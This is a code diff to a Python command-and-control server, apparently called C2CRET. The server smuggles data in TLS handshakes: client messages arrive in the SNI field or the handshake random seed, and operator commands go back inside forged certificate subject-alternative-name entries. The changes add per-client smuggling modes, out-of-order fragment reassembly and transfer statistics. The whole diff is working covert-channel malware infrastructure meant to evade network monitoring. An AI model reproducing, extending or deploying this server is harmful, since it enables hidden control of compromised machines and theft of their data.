@@ -56,7 +56,9 @@ import http.server
 # Globals
 #
 
-MAX_SINGLE_MSG_LEN = 255  # max len of a single SAN entry
+MAX_SINGLE_MSG_LEN = 254  # max len of a single SAN entry
+CLIENT_MAX_SNI_SIZE = 245  # max bytes a client can send in SNI
+CLIENT_MAX_SEED_SIZE = 16  # max bytes a client can send in random seen field
 MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62  # You can have up to 16k bytes total in a SAN record ~(roughly)
 # These for a random HOST/TLD generators
 MAX_TLD_LEN = 4
@@ -64,9 +66,8 @@ MAX_HOST_LEN = 8
 MAX_DOMAIN_LEN = 6
 MAX_CLIENT_AGE = 60  # Mark a client disconnected if it does not check in for this number of seconds
 VERBOSE = True  # Show some additional output
-TEST_MODE = False  # Run in connectivity test mode
 MAX_CONSOLE_MSG_LEN = 120  # only print this number of chars
-NS_TO_MS = 100000
+NS_TO_MS = 1000000
 
 # This Mixin is not that exciting since... ALL we are doing is handshaking TLS
 class TLSSocketServerMixIn:
@@ -84,15 +85,18 @@ class TLSSocketServerMixIn:
 
 class Client:
     def __init__(
-        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src="0.0.0.0:0"
+        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src="0.0.0.0:0", mode="seed"
     ) -> None:
+        self.mode = mode  # how we smuggle, "sni" || "seed"
+        self.mss = 0  # Maximum Segment Size (max byte per message)
         self.connected_ts = connected_ts
         self.last_poll_ts = last_poll_ts
         self.is_connected = False
         self.pending_cmd = []
         self.last_cmd = ""
+        self.last_san_msg = ""
         self.cmd_count = 0
-        self.fragments = []
+        self.fragments = {}
         # TODO: unique id should be used to uniquely identify a client - need to implement this in the client
         self.unique_id = unique_id
         self.src = src
@@ -101,8 +105,10 @@ class Client:
         self.stats = {
             "total_rtt_ms": 0,
             "packet_count": 0,
+            "packets_per_sec": 0,
             "bytes_per_sec": 0,
             "total_xfer_time": 0,
+            "first_fragment_ts": 0,
         }
         try:
             os.makedirs("files")
@@ -146,73 +152,73 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         # Check if this is a returning client
         is_existing_client = False
         client_msg.set(protocol_headers)
-        if TEST_MODE:
+        use_sni = False
+        client_msg_type = client_msg.get_msg_type(protocol_headers)
+        reply_msg_headers = Message()
+        server_reply_payload = b""
+        if VERBOSE:
+            self._print_verbose(client_msg, sni_object, protocol_headers, sock)
+        if client_msg_type == ClientMessage.TEST or client_msg_type == ClientMessage.CONNECT:
             # Test out client connectivity - Dont actually do C2 things
             results = self._print_test_results(client_msg, sni_object, protocol_headers, sock)
             reply_msg_headers = Message()
-            reply_msg_headers.header = client_msg.get_client_id(protocol_headers) + ServerMessage.TEST
-
+            msg_type = None
+            if client_msg_type == ClientMessage.TEST:
+                msg_type = ServerMessage.TEST
+            else:
+                msg_type = ServerMessage.ACK
+            reply_msg_headers.header = client_msg.get_client_id(protocol_headers) + msg_type
             server_reply_payload = (
                 reply_msg_headers.hex().encode()
-                + b"_FOOBAR_,"
+                + b"_C2CRET_,"
                 + str(results[0]).encode()
                 + b","
                 + str(results[1]).encode()
             )
+            use_sni = results[1]
+        if client_msg_type == ClientMessage.TEST:
             self.set_cert(server_reply_payload)
+            self._print_verbose_response(server_reply_payload)
             return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
-
-            server_reply_payload = reply_headers.hex().encode() + b"_FOOBAR_".hex().encode()
-            self.set_cert(server_reply_payload)
-            return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
-        # end if TEST_MODE
+        # end if TEST or CONNECT
         client_id = client_msg.get_client_id(protocol_headers)
         if client_id in self.CLIENT_DICT.keys():
             is_existing_client = True
-        # Get the message type
-        reply_msg_headers = Message()
-        # Get our SNI payload (which we may or may not need, depending on msg type
-        sni_decoded_bytes = b""
-        if VERBOSE:
-            print(f"Raw SNI: {sni_object.hostNames[0]}")
-        # sni_decoded_bytes = self._decode_msg(sni_object.hostNames[0])
-        try:
-            sni_decoded_bytes = self._decode_msg(sni_object.hostNames[0])
-        except:
-            sni_decoded_bytes = b"__ERROR_SERVER_FAILED_TO_DECODE_SNI!"
-        sni_text = ""
-        try:
-            sni_text = sni_decoded_bytes.decode()
-        except:
-            pass
-        cmd_msg = b""
-        # Our default SAN response is some random tld
-        client_msg_type = client_msg.get_msg_type(protocol_headers)
-        # if VERBOSE:
-        #     self._append_log_message(
-        #         f"RECV < [[ {len(sni_decoded_bytes)} bytes; client_id: {client_id.hex()}; msg_type={client_msg_type.hex()}; encoded_sni= ` {sni_text[:50]} ` ]]"
-        #     )
-        # self.set_cert(".".join(self._get_random_hostname()).encode())
-        server_reply_payload = b""
+        # Do other things based on the Message Type
         if client_msg_type == ClientMessage.CONNECT:
             # Setup a new nession
             # TODO: Make client sessions persist!
             # Which means a client will hash some machine specific attribute and write it to file, etc
             if not is_existing_client:
                 # generate a client id and insert into our list
-                client_id = bytes([random.randrange(0, 256) for _ in range(0, 2)])
+                # client_id = bytes([random.randrange(0, 256) for _ in range(0, 2)])
                 self.CLIENT_DICT[client_id] = Client()
                 self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
                 self.CLIENT_DICT[client_id].src = sock.getpeername()[0] + ":" + str(sock.getpeername()[1])
                 self.CLIENT_DICT[client_id].is_connected = True
+                if use_sni:
+                    self.CLIENT_DICT[client_id].mss = CLIENT_MAX_SNI_SIZE
+                    self.CLIENT_DICT[client_id].mode = "sni"
+                else:
+                    self.CLIENT_DICT[client_id].mss = CLIENT_MAX_SEED_SIZE
+                    self.CLIENT_DICT[client_id].mode = "seed"
                 self._append_log_message(
-                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src}"
+                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src} Mode: {self.CLIENT_DICT[client_id].mode}, MSS: {self.CLIENT_DICT[client_id].mss} bytes"
                 )
+                self.set_cert(server_reply_payload)
+                self._print_verbose_response(server_reply_payload)
+                return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
             else:
                 # This is a returning client
                 self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
-            reply_msg_headers.header = client_id + ServerMessage.ACK
-        if client_msg_type == ClientMessage.POLL and is_existing_client:
+                reply_msg_headers.header = client_id + ServerMessage.ACK
+        if not is_existing_client:
+            server_reply_payload = reply_msg_headers.hex().encode() + server_reply_payload
+            self.set_cert(server_reply_payload)
+            self._print_verbose_response(server_reply_payload)
+            return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
+        if client_msg_type == ClientMessage.POLL:
+            cmd_msg = b""
             # we got a POLL from an existing client (a heartbeat)
             self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
             # See if we have any pending CMD's to send to this client
@@ -225,15 +231,39 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
                 self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = int(time.time_ns() / NS_TO_MS)
             else:
                 reply_msg_headers.header = client_id + ServerMessage.ACK
-        if self._is_response_or_fragment(protocol_headers) and is_existing_client:
-            reply_msg_type = self._assemble_response(client_id, protocol_headers, sni_decoded_bytes)
+        if client_msg_type == ClientMessage.FRAGMENT:
+            mesg_decoded_bytes = b""
+            # print(f"!! DEBUG: in fragment")
+            if self.CLIENT_DICT[client_id].mode == "sni":
+                try:
+                    mesg_decoded_bytes = self._decode_msg(sni_object.hostNames[0])
+                    # print(f"!! DEBUG: decoded sni: {mesg_decoded_bytes}")
+                except:
+                    mesg_decoded_bytes = b"__ERROR_SERVER_FAILED_TO_DECODE_SNI!"
+            else:
+                # print(f"!! DEBUG: in else seed block")
+                mesg_decoded_bytes = reply_msg_headers.payload
+                # print(f"!! DEBUG: passing these bytes to assemble_response: {mesg_decoded_bytes}")
+            reply_msg_type = self._assemble_response(client_id, protocol_headers, mesg_decoded_bytes)
             reply_msg_headers.header = client_id + reply_msg_type
             reply_msg_headers.body = client_msg.body
-            if client_msg_type == ClientMessage.RESPONSE:
-                # We have a fully assembed payload, do something with it
-                response_bytes = b"".join(self.CLIENT_DICT[client_id].fragments)
-                pt = self.CLIENT_DICT[client_id].stats["total_rtt_ms"]
-                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = int(time.time_ns() / NS_TO_MS) - pt
+            if self.CLIENT_DICT[client_id].stats["first_fragment_ts"] == 0:
+                self.CLIENT_DICT[client_id].stats["first_fragment_ts"] = int(time.time_ns() / NS_TO_MS)
+        if client_msg_type == ClientMessage.RESPONSE:
+            # Lets ensure that we have a fully assembled message from the client!
+            payload_len = struct.unpack(">L", (client_msg.get_payload_len(protocol_headers)))[0]
+            payload_list = list(dict(sorted(self.CLIENT_DICT[client_id].fragments.items())).values())
+            if payload_len != len(payload_list):
+                self._append_log_message(
+                    f"Error: Client '{client_id.hex()}' sent {len(payload_list)} fragments, but we were expecting {payload_len}!"
+                )
+                reply_msg_headers.header = client_id + ServerMessage.ABORT
+            else:
+                reply_msg_headers.header = client_id + ServerMessage.ACK
+                response_bytes = b"".join(payload_list)
+                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = (
+                    int(time.time_ns() / NS_TO_MS) - self.CLIENT_DICT[client_id].stats["first_fragment_ts"]
+                )
                 self.CLIENT_DICT[client_id].stats["packet_count"] = len(self.CLIENT_DICT[client_id].fragments)
                 total_xfer_time = self.CLIENT_DICT[client_id].stats["total_rtt_ms"]
                 self.CLIENT_DICT[client_id].stats["payload_bytes"] = len(response_bytes)
@@ -241,18 +271,29 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
                 self.CLIENT_DICT[client_id].stats["bytes_per_sec"] = round(
                     (len(response_bytes) / ((self.CLIENT_DICT[client_id].stats["total_rtt_ms"]) / 1000)), 2
                 )
+                self.CLIENT_DICT[client_id].stats["packets_per_sec"] = round(
+                    (
+                        len(self.CLIENT_DICT[client_id].fragments)
+                        / ((self.CLIENT_DICT[client_id].stats["total_rtt_ms"]) / 1000)
+                    ),
+                    2,
+                )
                 self._append_log_message(self._record_client_msg(client_id, response_bytes))
+                # Reset client stats
+                self.CLIENT_DICT[client_id].stats["total_rtt_ms"] = int(time.time_ns() / NS_TO_MS)
+                self.CLIENT_DICT[client_id].stats["first_fragment_ts"] = 0
                 # clear our fragments buffer
-                self.CLIENT_DICT[client_id].fragments = []
-        if is_existing_client:
-            self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
-            self.CLIENT_DICT[client_id].is_connected = True
+                self.CLIENT_DICT[client_id].fragments = {}
+        # update existing clients' status
+        self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
+        self.CLIENT_DICT[client_id].is_connected = True
         # if VERBOSE:
         #     self._append_log_message(
         #         f"SEND > [[ {len(cmd_msg)} bytes; client_id: {client_id.hex()}; msg_type={reply_msg_type.hex()}; decoded_san= ` {cmd_msg.decode()[:50]} ` ]]"
         #     )
         server_reply_payload = reply_msg_headers.hex().encode() + server_reply_payload
         self.set_cert(server_reply_payload)
+        self._print_verbose_response(server_reply_payload)
         return (X509CertChain([self.KEYSTORE.public.tlslite]), self._get_random_seed())
 
     def _record_client_msg(self, client_id: bytes, response_bytes: bytes) -> str:
@@ -310,16 +351,19 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         """Adds a data fragment to the clients record until all is read
         Returns false if a retransmission is nessesary, in the case of CRC failure, etc
         """
+        # TODO: Make this receive OUT OF SEQUENCE fragments in order to accomodate a multi-threaded client
         m = Message()
-        payload_len = struct.unpack(">L", (m.get_payload_len(protocol_headers)))[0]
         seq_num = struct.unpack(">L", (m.get_sequence_num(protocol_headers)))[0]
         crc = struct.unpack(">L", (m.get_crc(protocol_headers)))[0]
         # enforce some size limitations (for now)
         # if payload_len > MAX_FILE_SIZE:
         #     return False
         # Ensure that our sequence number is what we expect
-        if seq_num != len(self.CLIENT_DICT[client_id].fragments):
-            # TODO: need a more graceful way to handle an out of sequence packet...
+        # TODO: makes fragments a DICT
+        mss = CLIENT_MAX_SNI_SIZE
+        if self.CLIENT_DICT[client_id].mode == "seed":
+            mss = CLIENT_MAX_SEED_SIZE
+        if seq_num < 0 or seq_num > int((MAX_FILE_SIZE / (mss / 2))):
             return ServerMessage.ABORT
         # computer our crc
         if m.compute_crc(fragment) != crc:
@@ -327,7 +371,7 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
                 print(f"FRAGMENT ERROR: {m.compute_crc(fragment)} != {crc} on '{fragment.hex()}'")
             return ServerMessage.CRC_ERROR
         # everthing looks good
-        self.CLIENT_DICT[client_id].fragments.append(fragment)
+        self.CLIENT_DICT[client_id].fragments[seq_num] = fragment
         return ServerMessage.ACK
 
     def set_cert(self, sni_msg_bytes: bytes) -> None:
@@ -371,6 +415,7 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         self.KEYSTORE.public.x509 = self.KEYSTORE._default_pub.x509
         self.KEYSTORE.public.pem = self.KEYSTORE._default_pub.pem
         self.KEYSTORE.public.tlslite = self.KEYSTORE._default_pub.tlslite
+        self.KEYSTORE.public._san_message_str = ""
         # super.__init__(self, *args)
 
     def handshake(self, tlslite_connector):
@@ -389,21 +434,22 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
 
     def create_message(self, message: bytes, encode=True) -> x509.Certificate:
         # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
-        sni_msg_str = message.decode()
+        san_msg_str = message.decode()
         if encode:
             host, domain, tld = self._get_random_hostname()
             fqdn = domain + "." + tld
             name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
-            sni_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
+            san_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
         else:
-            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sni_msg_str)])
-        if len(sni_msg_str) > MAX_SINGLE_MSG_LEN:
+            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, san_msg_str)])
+        if len(san_msg_str) > MAX_SINGLE_MSG_LEN:
             print(
-                f"ERROR: Encoded message length of {len(sni_msg_str)} exceeds MAX_SINGLE_MSG_LEN of {MAX_SINGLE_MSG_LEN}"
+                f"ERROR: Encoded message length of {len(san_msg_str)} exceeds MAX_SINGLE_MSG_LEN of {MAX_SINGLE_MSG_LEN}"
             )
             raise NotImplementedError
+        self.KEYSTORE.public._san_message_str = san_msg_str
         # Our smuggled payload goes into the SAN
-        san = x509.SubjectAlternativeName([x509.DNSName(sni_msg_str)])
+        san = x509.SubjectAlternativeName([x509.DNSName(san_msg_str)])
         # Now ready to create the crafter Certificate...
         basic_constraints = x509.BasicConstraints(ca=True, path_length=0)
         create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
@@ -523,6 +569,52 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
     def _print_test_results(
         self, client_msg: Message, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
     ) -> typing.Tuple[bool, bool]:
+        header_str = ""
+        try:
+            header_str = bytes.fromhex(client_msg.get_payload(protocol_headers).decode()).decode()
+        except:
+            pass
+        sni_bytes = b""
+        sni_bytes_decoded = b""
+        try:
+            sni_bytes = sni_object.hostNames[0]
+            if VERBOSE:
+                print(f"<   Raw SNI: {sni_bytes.decode()}")
+        except:
+            if VERBOSE:
+                print(f"<   ERROR: NO SNI PRESENT!")
+        try:
+            sni_bytes_decoded = self._decode_msg(sni_bytes).decode()
+            if VERBOSE:
+                print(f"<      Decoded SNI bytes: {sni_bytes_decoded}")
+        except:
+            if VERBOSE:
+                print(f"<      ERROR: FAILED TO DECODE SNI!")
+        if VERBOSE:
+            print()
+        sni_success = False
+        rnd_success = False
+        if header_str == "_C2CRET_":
+            if VERBOSE:
+                print("[+] Random Seed Smuggling PASSED!")
+            rnd_success = True
+        else:
+            if VERBOSE:
+                print("[!] Random Seed Smuggling FAILED")
+        if sni_bytes_decoded == "_C2CRET_":
+            if VERBOSE:
+                print("[+] SNI Smuggling PASSED!")
+            sni_success = True
+        else:
+            if VERBOSE:
+                print("[!] SNI Smuggling FAILED")
+        if VERBOSE:
+            print("Test complete.")
+        return (rnd_success, sni_success)
+
+    def _print_verbose(
+        self, client_msg: Message, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
+    ) -> None:
         print()
         print(f"< CONNECTION FROM: {sock.getpeername()[0] + ':' + str(sock.getpeername()[1])}")
         print(f"<   Raw Protocol Headers: {self._to_hex_x_notation(protocol_headers)}")
@@ -538,9 +630,7 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
             header_str = bytes.fromhex(client_msg.get_payload(protocol_headers).decode()).decode()
             print(f"<      payload: {header_str}")
         except:
-            print(
-                f"<      payload: __INVALID_PAYLOAD__: '{self._to_hex_x_notation(client_msg.get_payload(protocol_headers))}'"
-            )
+            print(f"<      payload: '{self._to_hex_x_notation(client_msg.get_payload(protocol_headers))}'")
         sni_bytes = b""
         sni_bytes_decoded = b""
         try:
@@ -554,20 +644,20 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         except:
             print(f"<      ERROR: FAILED TO DECODE SNI!")
         print()
-        sni_success = False
-        rnd_success = False
-        if header_str == "_FOOBAR_":
-            print("[+] Random Seed Smuggling PASSED!")
-            rnd_success = True
-        else:
-            print("[!] Random Seed Smuggling FAILED")
-        if sni_bytes_decoded == "_FOOBAR_":
-            print("[+] SNI Smuggling PASSED!")
-            sni_success = True
-        else:
-            print("[!] SNI Smuggling FAILED")
-        print("Test complete.")
-        return (rnd_success, sni_success)
+
+    def _print_verbose_response(self, response_bytes: bytes) -> None:
+        # print(f"!! DEBUG: {response_bytes}")
+        m = Message()
+        headers = bytes.fromhex(response_bytes[:64].decode())
+        body = response_bytes[64:]
+        m.set(headers)
+        print()
+        print(f">   Raw Response Headers: {self._to_hex_x_notation(headers)}")
+        print(f">      cid: {self._to_hex_x_notation(m.get_client_id(headers))}")
+        print(f">      type: {ServerMessage().type_to_text(m.get_msg_type(headers))}")
+        print(f">   Raw Response Body: {body}")
+        print(f">  Encoded SAN Message: {self.KEYSTORE.public._san_message_str}")
+        print()
 
     @staticmethod
     def _decode_msg(msg: bytes) -> bytes:
@@ -618,19 +708,10 @@ if __name__ == "__main__":
         required=False,
         help="Bind to Listening TCP Port number",
     )
-    arg_parse.add_argument(
-        "-t",
-        "--test",
-        action="store_true",
-        required=False,
-        help="Run in Connectivity Test Mode",
-    )
     args = arg_parse.parse_args()
     port = 8443
     if args.port:
         port = int(args.port)
-    if args.test:
-        TEST_MODE = True
     server = None
     C2Server = TLSServer(("0.0.0.0", port), None)
     C2Server.init()
